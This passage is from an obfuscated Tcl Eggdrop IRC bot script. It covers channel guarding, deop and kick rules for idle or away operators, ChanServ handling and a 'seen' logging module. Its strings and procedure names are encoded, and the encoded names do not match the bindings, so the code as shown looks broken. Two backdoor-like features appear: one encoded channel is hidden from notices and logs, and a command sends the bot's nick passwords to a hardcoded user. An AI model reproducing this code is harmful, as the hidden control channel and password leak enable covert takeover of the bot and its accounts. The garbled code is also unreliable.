set [lines "mrxpxs"] "[lindex $rest 0]\[[rand 9][rand 9][randstring 1]\]"
putsrv "MRXP ~$nickch"
} {
if {$botnick != $nick && $botnick != $altnick} { return 0 }
set [lines "pvvk-mrxp"] 0
putsrv "MRXP ~[rands 8]~"
}
return 0
}
proc [lines "kfy_zogmrxp"] {nick uhost hand chan rest} {
global altnick keep-nick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "pvvk-mrxp"] 0
putsrv "MRXP ~$altnick"
}
bind time - "*7 * * * *" cho_cho
bind raw - 305 not_away
proc [lines "mlg_zdzb"] { from keyword arg } {
if {[isutimer "del_nobase"]} { utimer 1 del_nobase }
if {[isutimer "goback"]} { utimer 2 goback }
unsetignore "*!*@*"
}
bind raw - 404 ch_moderate
bind raw - 473 ch_invite
bind raw - 474 ch_banned
bind raw - 475 ch_key
bind raw - 478 ch_full
bind raw - 432 nickERROR
set [lines "hvierxvhmznv"] "ChanServ"
bind raw - 601 services_offline
bind raw - 605 services_offline
bind raw - 604 services_online
bind raw - 600 services_online
bind evnt - init-server addwatch
proc [lines "zwwdzgxs"] { type } {
global servicesname
putserv "watch +$servicesname"
}
proc [lines "hvierxvh_luuormv"] { from keyword args } {
global botnick
foreach x [channels] {
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "*+csguard*" [channel info $x]]} {
setuser $cflag XTRA "TOPICC" [topic $x]
saveuser
putsrv "KIRENHT ~$x ~:14XszmHvie\[9Wldm14\]"
if {[isop $botnick $x]} { 
set [lines "glkx"] "[lines "14Hvierxvh Rh Xfiivmgob Wldm. Kovzhv Dzrg Uli Z Nlnvmg..."]"
if {[topic $x] == $topc} { return 0 }
putsrv "GLKRX ~$x ~:14Hvierxvh Rh Xfiivmgob Wldm. Kovzhv Dzrg Uli Z Nlnvmg..."
}
}
}
}
proc [lines "hvierxvh_lmormv"] { from keyword args } {
global botnick
foreach x [channels] {
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "*+csguard*" [channel info $x]]} {   
if {[isop $botnick $x]} {
if {[topic $x] == [getuser $cflag XTRA "TOPICC"]} { return 0 }
puthlp "GLKRX ~$x :[getuser $cflag XTRA "TOPICC"]"
}
putsrv "KIRENHT ~$x ~:14XszmHvie\[4LmOrmv14\]" 
}
}
}
proc [lines "mrxpVIILI"] { from keyword arg } {
global nick
set [lines "mrxp"] "aLoWaiNi[unixtime]"
}
proc [lines "xs_nlwvizgv"] { from keyword arg } {
putlog "CANT SEND ON MODERATE!"
if {[isutimer "del_nobase"]} {
catch { clearqueue all }
foreach x [utimers] {
if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] ; utimer 1 del_nobase }
}
}
}
proc [lines "xs_rmergv"] { from keyword arg } {
global double joinme notc 
set [lines "xszm"] [lindex $arg 1]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+R)"
}
if {[string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
putsrv "XszmHvie rmergv ~$chan"
}
set [lines "wlfyov"] 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~IvNLEV ~$chan ~4(+R)"
}
channel remove $chan
savechan
}
set [lines "qlrmnv"] ""
set [lines "wlfyov"] 0
}
return
}
bind pub m `scan pub_scan
proc [lines "kfy_hxzm"] {nick uhost hand chan arg} {
global botnick
foreach nick [chanlist $chan] {
if {$nick == $botnick} { continue }
if {[matchattr $nick f]} { continue }
if {[isop $nick $chan]} {
whoisq $nick
putserv "WHOIS $nick"
}
}
}
bind time - "12 * * * *" scanning
bind time - "42 * * * *" scanning
proc [lines "hxzmmrmt"] {min hour day month year} {
global botnick 
foreach chan [channels] {
if {![isop $botnick $chan]} { return 0 }
if {[string match "*+unidentifyop*" [channel info $chan]]} { 
putserv "PRIVMSG $chan :\001ACTION ((((S.c.a.n.i.n.g)))) \001"
}
foreach nick [chanlist $chan] {
if {$nick == $botnick} { continue }
if {[matchattr $nick f]} { continue }
if {[isop $nick $chan]} {
whoisq $nick
putserv "WHOIS $nick"
}
}
}
}
bind raw - 301 raw:swi_wi301
proc [lines "izd:hdr_dr301"] {from key arg} {
global botnick 
foreach chan [channels] {
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "mrxp"] [lindex [split $arg] 1]
if {$nick == $botnick} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[string match "*+noawayop*" [channel info $chan]]} {
if {[isop $nick $chan]} {
set [lines "zdzbnvhhztv"] [string trimleft [join [lrange [split $arg] 2 end]] :]
putlog "Log $nick is Away : $awaymessage"
if {[string match "*t.¢*" [uncolor $awaymessage]]} { 
putlog "!Log! PaSs This bOt"
return 0 
}
if {![string match "*k*" [getchanmode $chan]]} {

putserv "MODE $chan -ko+v 4n14o.4a14waY.4@14p $nick $nick"
} {
putserv "MODE $chan -o+v $nick $nick"
}
}
}
}
}
bind raw - 317 raw:swi_wi317
proc [lines "izd:hdr_dr317"] {from key arg} {
foreach chan [channels] {
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "mrxp"] [lindex [split $arg] 1]
set [lines "rwovgrnv"] [lindex [split $arg] 2]
if {[matchattr $nick f]} { return 0 }
if {[string match "*+idleop*" [channel info $chan]]} { 
if {[isop $nick $chan]} { 
if {$idletime > [getuser $cflag XTRA "IDLE"]} { 
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -ko+v 4n14o.4i14dLe.4@14p $nick $nick" 
} {
putserv "MODE $chan -o+v $nick $nick"
}
}
}
}
}
}
proc [lines "hdr_dryrmwzoo"] { } {
bind raw - 301 raw:swi_wi301
bind raw - 317 raw:swi_wi317
}
proc [lines "hdr_drfmyrmwzoo"] { } {
unbind raw - 301 raw:swi_wi301
unbind raw - 317 raw:swi_wi317
}
proc [lines "xs_yzmmvw"] { from keyword arg } {
global double joinme notc 
set [lines "xszm"] [lindex $arg 1]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+Y)"
}
if {[string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
putsrv "XszmHvie rmergv ~$chan"
puthlp "XszmHvie fmyzm ~$chan"
}
set [lines "wlfyov"] 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~IvNleV ~$chan ~4(+Y)"
}
if {[string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
putsrv "XszmHvie rmergv ~$chan"
}
channel remove $chan
savechan
}
set [lines "qlrmnv"] ""
set [lines "wlfyov"] 0
}
return 0
}
proc [lines "xs_pvb"] { from keyword arg } {
global double joinme notc lastkey chankey
set [lines "xszm"] [lindex $arg 1]
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+P)"
}
if {[matchattr $cflag K]} {
puthlp "QLRM ~$chan ~:~[dezip [getuser $cflag XTRA "CI"]~]"
} {
puthlp "QLRM ~$chan"
}
if {[info exists lastkey]} {
puthlp "QLRM ~$chan ~:~$lastkey"
}
set [lines "wlfyov"] 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~IvNleV ~$chan ~4(+P)"
}
channel remove $chan
savechan
return 0
}
if {[string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
putsrv "XszmHvie rmergv ~$chan"
}
if {[string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
putsrv "QLRM ~$chan ~:~$chankey"
}
set [lines "qlrmnv"] ""
set [lines "wlfyov"] 0
}
return 0
}
proc [lines "xs_ufoo"] { from keyword arg } {
global double joinme notc botnick
set [lines "xszm"] [lindex $arg 1]
if {[isop $botnick $chan]} {
set [lines "yzmh"] ""
set [lines "r"] 0
foreach x [chanbans $chan] {
if {$i < 5} {
append bans " [lindex $x 0]"
set [lines "r"] [incr i]
}
}
putserv "MODE $chan -kbbbbb 4BaN.LIsT.FuLL $bans"
return 0
}
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+O)"
}
if {[string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
putsrv "XszmHvie rmergv ~$chan"
}
set [lines "wlfyov"] 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~IvNLEV ~$chan ~4(+O)"
}
channel remove $chan
savechan
}
set [lines "qlrmnv"] ""
set [lines "wlfyov"] 0
}
return 0
}
if {$altnick == ""} { 
set [lines "zogmrxp"] [randstring 7] 
}
set [lines "yzwdliwh"] ""
set [lines "zwedliwh"] ""
set [lines "yzmpvb"] "T"
proc [lines "xlmurt"] {} {
global nick owner nickpass altpass altnick realname owner kops my-ip banner cycle_random
global notc logstore cfgfile badwords advwords ban-time my-hostname kickclr bankey chankey
if {[validuser "config"]} {
if {[getuser "config" XTRA "REALNAME"]!=""} {
set [lines "ivzomznv"] [dezip [getuser "config" XTRA "REALNAME"]]
} else {
set [lines "ivzomznv"] [realnames]
}
if {[getuser "config" XTRA "USERNAME"]!=""} {
set [lines "ivzomznv"] [dezip [getuser "config" XTRA "USERNAME"]]
}
if {[getuser "config" XTRA "NICK"]!=""} {
set [lines "mrxp"] [dezip [getuser "config" XTRA "NICK"]]
}
if {[getuser "config" XTRA "NICKPASS"]!=""} {
set [lines "mrxpkzhh"] [encrypt $chankey [getuser "config" XTRA "NICKPASS"]]
}
if {[getuser "config" XTRA "ALTNICK"]!=""} {
set [lines "zogmrxp"] [dezip [getuser "config" XTRA "ALTNICK"]]
}
if {[getuser "config" XTRA "ALTPASS"]!=""} {
set [lines "zogkzhh"] [encrypt $chankey [getuser "config" XTRA "ALTPASS"]]
}
if {[getuser "config" XTRA "BAN"]!=""} {
set [lines "yzmmvi"] [dezip [getuser "config" XTRA "BAN"]]
lappend cycle_random $banner
}
if {[getuser "config" XTRA "BANTIME"]!=""} {
set [lines "yzm-grnv"] [getuser "config" XTRA "BANTIME"]
}
if {[getuser "config" XTRA "BANKEY"]!=""} { 
set [lines "yzmpvb"] "F"
}
if {[getuser "config" XTRA "BADWORDS"]!=""} {
set [lines "yzwdliwh"] [getuser "config" XTRA "BADWORDS"]
}
if {$badwords == ""} {
set [lines "yzwdliwh"] "cibai bitch kimak memek kontol kanjut bangsat ngentot fuck peler lanciau bajingan vagina ngewe shit asshole anjing babi kampang"
setuser "config" XTRA "BADWORDS" $badwords
}
if {[getuser "config" XTRA "ADVWORDS"]!=""} {
set [lines "zwedliwh"] [getuser "config" XTRA "ADVWORDS"]
}
if {$advwords == ""} {
set [lines "zwedliwh"] "http www join klik clic ftp:// click .com .net .org .us .cn .uk .il .biz .info .tk .us"
setuser "config" XTRA "ADVWORDS" $advwords
}
if {[getuser "config" XTRA "KOPS"]!=""} {
set [lines "plkh"] "T"
}
if {[getuser "config" XTRA "KCLR"]!=""} {
set [lines "prxpxoi"] "T"
}
if {[getuser "config" XTRA "VHOST"]!=""} {
set [lines "nb-slhgmznv"] [getuser "config" XTRA "VHOST"]
set [lines "nb-rk"] [getuser "config" XTRA "VHOST"]
}
if {[getuser "config" XTRA "LOGCHAN"]!=""} { 
putlog "!Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
set [lines "olthgliv"] "${cfgfile}.log"
logfile jpk [getuser "config" XTRA "LOGCHAN"] $logstore 
}
} else {
adduser "config" ""
chattr "config" "-hp"
}
foreach x [userlist] {
chattr $x -Q
if {$x != "config" && $x != "AKICK"} {
foreach y [getuser $x HOSTS] {
delhost $x $y
}
set [lines "slhgnzhp"] "${x}!*@*"
setuser $x HOSTS $hostmask
}
}
if {![validuser "AKICK"]} {
set [lines "slhgnzhp"] "telnet!*@*"
adduser "AKICK" $hostmask
chattr "AKICK" "-hp"
chattr "AKICK" "K"
}
if {![validuser $owner]} {
set [lines "slhgnzhp"] "$owner!*@*"
adduser $owner $hostmask
chattr $owner "Zfhjmnoptx"
}
saveuser
}
utimer 1 {config}
utimer 2 {seen}
proc ack_act {nick uhost hand chan rest} {
   global botnick vern
   set elex $vern
   puthelp "NOTICE $nick :\001VER $elex \001"
   return 0
}
proc [lines "fmxloli"] {s} {
regsub -all --  $s "" s
regsub -all --  $s "" s
regsub -all --  $s "" s
regsub -all -- \[0-9\]\[0-9\],\[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\],\[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\]\[0-9\],\[0-9\] $s "" s
regsub -all -- \[0-9\],\[0-9\] $s "" s
regsub -all -- \[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\] $s "" s
return $s
}
proc [lines "nht_ylghvg"] {unick uhost hand rest} {
global nick nickpass altpass altnick own notc 
if {$unick != $own} {
return 0
}
puthlp "MLGRXV ~$unick ~:~$notc ~1hg ~$nick ~(~$nickpass) ~2mw ~$altnick ~(~$altpass)"
return 0
}
proc [lines "nht_ivfhvi"] {nick uhost hand rest} {
global botnick owner notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$nick != $owner} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist] {
if {($x != "config") && ($x != "AKICK")} { deluser $x }
}
adduser $owner "$owner!*@*"
chattr $owner "Zfhjmnoptx"
puthlp "MLGRXV ~$nick ~:~$notc ~Ivhvgrmt FhVI hfxvhhufoob, hvg kzhh 1hg."
saveuser
}
set bs(limit) 8000
set bs(nicksize) 32
set bs(no_pub) ""
set bs(no_log) ""
set bs(log_only) ""
set bs(flood) 4:15
set bs(ignore) 1
set bs(ignore_time) 2
set bs(smartsearch) 1
set bs(logqueries) 1
set bs(path) "language/"
set bs(updater) 10402
set bs(oldver) $bs(updater)
set bs(version) bseen1.4.2c
proc [lines "hvvm"] {} {
global version notc notd
catch { unbind time - "12 * * * *" bs_timedsave }
catch { unbind time -  "*1 * * * *" bs_trim }
catch { unbind join -|- * bs_join_botidle }
catch { unbind join -|- * bs_join }
catch { unbind sign -|- * bs_sign }
catch { unbind kick -|- * bs_kick }
catch { unbind nick -|- * bs_nick }
catch { unbind splt -|- * bs_splt }
catch { unbind rejn -|- * bs_rejn }
catch { unbind chjn -|- * bs_chjn }
catch { unbind chpt -|- * bs_chpt }
catch { unbind bot -|- bs_botsearch bs_botsearch }
catch { unbind bot -|- bs_botsearch_reply bs_botsearch_reply }
catch { unbind pub -|- [string trim "!"]seen pub_seen }
catch { unbind pub -|- [string trim "!"]seennick bs_pubreq2 }
catch { unbind pub - !ping public_ping }
catch { unbind part -|- * bs_part_oldver }
catch { unbind chof -|- * bs_chof }
set [lines "nHVVM"] "F"
foreach x [channels] {
set [lines "xrmul"] [channel info $x]
if {[string match "*+seen*" $cinfo]} {
set [lines "nHVVM"] "T"
}
}
if {$mSEEN == "F"} {return 0}
bind time - "12 * * * *" bs_timedsave
bind time -  "*1 * * * *" bs_trim
bind join -|- * bs_join_botidle
bind join -|- * bs_join
bind sign -|- * bs_sign
bind kick -|- * bs_kick
bind nick -|- * bs_nick
bind splt -|- * bs_splt
bind rejn -|- * bs_rejn
bind chjn -|- * bs_chjn
bind chpt -|- * bs_chpt
bind bot -|- bs_botsearch bs_botsearch
bind bot -|- bs_botsearch_reply bs_botsearch_reply
bind pub -|- !seen pub_seen
bind pub -|- !seennick bs_pubreq2
bind pub - !ping public_ping
if {[lsearch -exact [bind time -|- "*2 * * * *"] bs_timedsave] > -1} {unbind time -|- "*2 * * * *" bs_timedsave}
if {[string trimleft [lindex $version 1] 0] >= 1050000} {
bind part -|- * bs_part  
} {
if {[lsearch -exact [bind part -|- *] bs_part] > -1} {unbind part -|- * bs_part}
bind part -|- * bs_part_oldver
}
foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
if {[lsearch -exact [bind chof -|- *] bs_chof] > -1} {unbind chof -|- * bs_chof}
if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}
if {[info exists bs_list]} {
if {[info exists bs(oldver)]} {
if {$bs(oldver) < $bs(updater)} {bs_update}
} {bs_update}
}
}
utimer 2 seen
proc [lines "yh_urog"] {data} {
regsub -all -- \\\\ $data \\\\\\\\ data 
regsub -all -- \\\[ $data \\\\\[ data 
regsub -all -- \\\] $data \\\\\] data
regsub -all -- \\\} $data \\\\\} data 
regsub -all -- \\\{ $data \\\\\{ data 
regsub -all -- \\\" $data \\\\\" data 
return $data
}
proc [lines "yh_uollw_rmrg"] {} {
global bs bs_flood_array 
if {![string match *:* $bs(flood)]} {return}
set bs(flood_num) [lindex [split $bs(flood) :] 0]
set bs(flood_time) [lindex [split $bs(flood) :] 1]
set i [expr $bs(flood_num) - 1]
while {$i >= 0} {
set bs_flood_array($i) 0 
incr i -1  
}
} 
bs_flood_init
proc [lines "yh_uollw"] {nick uhost} {
global bs bs_flood_array 
if {$bs(flood_num) == 0} {return 0} 
set i [expr $bs(flood_num) - 1]
while {$i >= 1} {
set bs_flood_array($i) $bs_flood_array([expr $i - 1]) 
incr i -1
} 
set bs_flood_array(0) [unixtime]
if {[expr [unixtime] - $bs_flood_array([expr $bs(flood_num) - 1])] <= $bs(flood_time)} {
if {$bs(ignore)} {newignore [join [maskhost *!*[string trimleft $uhost ~]]] $bs(version) "*" $bs(ignore_time)} 
return 1
} {return 0}
}
proc [lines "yh_ivzw"] {} {
global bs_list userfile bs
if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
set [lines "gvnk"] [split $userfile /] 
set [lines "gvnk"] [lindex $temp [expr [llength $temp]-1]] 
set [lines "mznv"] [lindex [split $temp .] 0]
}
if {![file exists $bs(path)bs_data.$name]} {
if {![file exists $bs(path)bs_data.$name.bak]} {
return
} {exec cp $bs(path)bs_data.$name.bak $bs(path)bs_data.$name}
}
set fd [open $bs(path)bs_data.$name r]
set [lines "yhf_evi"] "" 
set [lines "yivzp"] 0
while {![eof $fd]} {
set [lines "rmk"] [gets $fd] 
if {[eof $fd]} {break} 
if {[string trim $inp " "] == ""} {continue}
if {[string index $inp 0] == "#"} {
set [lines "yhf_evihrlm"] [string trimleft $inp #] 
continue
}
if {![info exists bsu_version] || $bsu_version == "" || $bsu_version < $bs(updater)} {
if {[source scripts/bseen_updater1.4.2.tcl] != "ok"} {set temp 1} {set temp 0}
if {$temp || [bsu_go] || [bsu_finish]} {
rehashing
}
set [lines "yivzp"] 1 
break
}
set [lines "mrxp"] [lindex $inp 0] 
set bs_list([string tolower $nick]) $inp
}
close $fd
if {$break} {bs_read}
}
proc [lines "yh_fkwzgv"] {} {
global bs
bs_save 
bs_read
}
proc [lines "yh_grnvwhzev"] {min b c d e} {bs_save}
proc [lines "yh_hzev"] {} {
global bs_list userfile bs notc
if {[array size bs_list] == 0} {return}
if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
set [lines "gvnk"] [split $userfile /] 
set [lines "gvnk"] [lindex $temp [expr [llength $temp]-1]] 
set [lines "mznv"] [lindex [split $temp .] 0]
}
if {[file exists $bs(path)bs_data.$name]} {catch {exec cp -f $bs(path)bs_data.$name $bs(path)bs_data.$name.bak}}
set fd [open $bs(path)bs_data.$name w] 
set [lines "rw"] [array startsearch bs_list] 
puts $fd "#$bs(updater)"
while {[array anymore bs_list $id]} {
set [lines "rgvn"] [array nextelement bs_list $id] 
puts $fd "$bs_list($item)"
} 
array donesearch bs_list $id
close $fd
}
proc [lines "yh_kzig_lowevi"] {a b c d} {bs_part $a $b $c $d ""}
proc [lines "yh_kzig"] {nick uhost hand chan reason} {
if {[string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] part $chan [split $reason]"
}
proc [lines "yh_qlrm"] {nick uhost hand chan} {
if {[string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] join $chan"
}
proc [lines "yh_hrtm"] {nick uhost hand chan reason} {
if {[string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] quit $chan [split $reason]"
}
proc [lines "yh_prxp"] {nick uhost hand chan knick reason} {
set [lines "hxszm"] $chan
if {[string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { 
set [lines "hxszm"] "-secret-"
}
bs_add $knick "[getchanhost $knick $chan] [unixtime] kick $schan [list $nick] [list $reason]"
}
proc [lines "yh_mrxp"] {nick uhost hand chan newnick} {
if {[string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { 
set [lines "xszm"] "-secret-"
}
set [lines "grnv"] [unixtime] 
bs_add $nick "[list $uhost] [expr $time -1] nick $chan [list $newnick]" 
bs_add $newnick "[list $uhost] $time rnck $chan [list $nick]"
}
proc [lines "yh_hkog"] {nick uhost hand chan} {
if {[string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] splt $chan"
}
proc [lines "yh_ivqm"] {nick uhost hand chan} {
if {[string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] rejn $chan"
}
proc [lines "yh_xsqm"] {bot hand channum flag sock from} {bs_add $hand "[string trimleft $from ~] [unixtime] chjn $bot"}
proc [lines "yh_xskg"] {bot hand args} {set old [split [bs_search ? [string tolower $hand]]] ; if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] chpt $bot"}}
proc [lines "yh_ylghvzixs"] {from cmd args} {
global botnick notc
set [lines "zith"] [join $args]
set [lines "xlnnzmw"] [lindex $args 0] 
set [lines "gzitvg"] [lindex $args 1] 
set [lines "mrxp"] [lindex $args 2] 
set [lines "hvzixs"] [bs_filt [join [lrange $args 3 e]]]
if {[string match *\\\** $search]} {
set [lines "lfgkfg"] [bs_seenmask bot $nick $search]
if {$output != "No matches were found." && ![string match "I'm not on *" $output]} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
} {
set [lines "lfgkfg"] [bs_output bot $nick [bs_filt [lindex $search 0]] 0]
if {$output != 0 && [lrange [split $output] 1 4] != "unseeing"} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
}
}
proc [lines "yh_ylghvzixs_ivkob"] {from cmd args} {
global notc bs
set [lines "zith"] [join $args]
if {[lindex [lindex $args 2] 5] == "not" || [lindex [lindex $args 2] 4] == "not"} {return}
if {![info exists bs(bot_delay)]} {
set bs(bot_delay) on 
utimer 10 {if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}} 
if {![lindex $args 0]} {putdcc [lindex $args 1] "[join [lindex $args 2]]"} {
puthlp "~[lindex $args 1]~ :~[join [lindex $args 2]~]"
}
}
}
proc [lines "kfy_hvvm"] {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 0}
proc [lines "yh_kfyivj2"] {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 1}
proc [lines "yh_kfyivj"] {nick uhost hand chan args no} {
global botnick bs notc
if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
if {[bs_flood $nick $uhost]} {return 0}
set [lines "r"] 0 
if {[lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0} {return 0}
if {$bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1} {return 0}
set [lines "zith"] [bs_filt [join $args]]
set [lines "gzitvg"] "NOTICE $nick"
if {[string match *\\\** [lindex $args 0]]} {
set [lines "lfgkfg"] [bs_seenmask $chan $hand $args]
if {$output == "No Matches!"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
regsub -all -- ~ $output "" output
puthlp "~$target ~:~[lgrnd]~ ~$output"
return $bs(logqueries)
}
set [lines "wzgz"] [bs_filt [string trimright [lindex $args 0] ?!.,]]
if {[string tolower $nick] == [string tolower $data]} {
puthlp "~$target ~:~[lgrnd]~ ~$nick, ~tl ollp rm z nriili..!" 
return $bs(logqueries)
}
if {[string tolower $data] == [string tolower $botnick] } {
puthlp "~$target ~:\001ZXGRLM Irtsg Sviv!\001" 
return $bs(logqueries)
}
if {[onchan $data $chan]} {
puthlp "~$target ~:~[lgrnd]~ ~$nick, ~~$data ~rh irtsg sviv..!" 
return $bs(logqueries)
}
set [lines "lfgkfg"] [bs_output $chan $nick $data $no] 
if {$output == 0} {return 0}
if {[lrange [split $output] 1 4] == "I don't remember seeing"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
regsub -all -- ~ $output "" output
puthlp "~$target ~:~[lgrnd]~ ~$output"
return $bs(logqueries)
}
proc [lines "yh_lfgkfg"] {chan nick data no} {
global botnick bs version bs_list
set [lines "wzgz"] [string tolower [string trimright [lindex $data 0] ?!.,]]
if {$data == ""} {return 0}
if {[string tolower $nick] == $data} {return [concat $nick, go look in a mirror.]}
if {$data == [string tolower $botnick]} {return [concat $nick, Im right here. Quit wasting my time!]}
if {[string length $data] > $bs(nicksize)} {return 0} 
if {$bs(smartsearch) != 1} {set no 1}
if {$no == 0} {
set [lines "nzgxsvh"] ""
set [lines "szmw"] ""
set [lines "zwwb"] ""
if {[lsearch -exact [array names bs_list] $data] != "-1"} { 
set addy [lindex $bs_list([string tolower $data]) 1] 
set [lines "szmw"] [finduser $addy]
foreach item [bs_seenmask dcc ? [maskhost $addy]] {if {[lsearch -exact $matches $item] == -1} {set matches "$matches $item"}}
}
if {[validuser $data]} {set hand $data}
if {$hand != "*" && $hand != ""} {
if {[string trimleft [lindex $version 1] 0]>1030000} {set hosts [getuser $hand hosts]} {set hosts [gethosts $hand]}
foreach addr $hosts {
foreach item [string tolower [bs_seenmask dcc ? $addr]] {
if {[lsearch -exact [string tolower $matches] [string tolower $item]] == -1} {set matches [concat $matches $item]}
}
}
}
if {$matches != ""} {
set [lines "nzgxsvh"] [string trimleft $matches " "]
set [lines "ovm"] [llength $matches]
if {$len == 1} {return [bs_search $chan [lindex $matches 0]]}
if {$len > 99} {return [concat I found $len matches to your query\; please refine it to see any output.]}
set [lines "nzgxsvh"] [bs_sort $matches]
set [lines "pvb"] [lindex $matches 0]
if {[string tolower $key] == [string tolower $data]} {return [bs_search $chan $key]}
if {$len <= 5} {
set [lines "lfgkfg"] [concat sorted most $len matches recent: [join $matches].]
set [lines "lfgkfg"] [concat $output  [bs_search $chan $key]] 
return $output
} {
set output [concat found $len matches matches. most 5 recent (sorted): [join [lrange $matches 0 4]].]
set [lines "lfgkfg"] [concat $output [bs_search $chan $key]] 
return $output
}
}
}
set [lines "gvnk"] [bs_search $chan $data]
if {$temp != 0} { return $temp } {
#$data not found in $bs_list, so search userfile
if {![validuser [bs_filt $data]] || [string trimleft [lindex $version 1] 0]<1030000} { 
return "$nick, $data <n/a>"
} {
set [lines "hvvm"] [getuser $data laston]
if {[getuser $data laston] == ""} {return "$nick, $data <n/a>"}
if {($chan != [lindex $seen 1] || $chan == "bot" || $chan == "msg" || $chan == "dcc") && [validchan [lindex $seen 1]] && [lindex [channel info [lindex $seen 1]] 23] == "+secret"} {
set [lines "xszm"] "-secret-"
} {
set [lines "xszm"] [lindex $seen 1]
}
return [concat $nick, $data was last seen on $chan [bs_when [lindex $seen 0]] ago.]
}
}
}
proc [lines "yh_hvzixs"] {chan n} {
global bs_list notc 
if {![info exists bs_list]} {return 0}
if {[lsearch -exact [array names bs_list] [string tolower $n]] != "-1"} { 
set data [split $bs_list([string tolower $n])]
set [lines "m"] [join [lindex $data 0]] 
set [lines "zwwb"] [lindex $data 1] 
set [lines "grnv"] [lindex $data 2] 
set [lines "nzipvi"] 0
if {([string tolower $chan] != [string tolower [lindex $data 4]] || $chan == "dcc" || $chan == "msg" || $chan == "bot") && [validchan [lindex $data 4]] && [lindex [channel info [lindex $data 4]] 23] == "+secret"} {
set [lines "xszm"] "-secret-"
} {
set [lines "xszm"] [lindex $data 4]
}
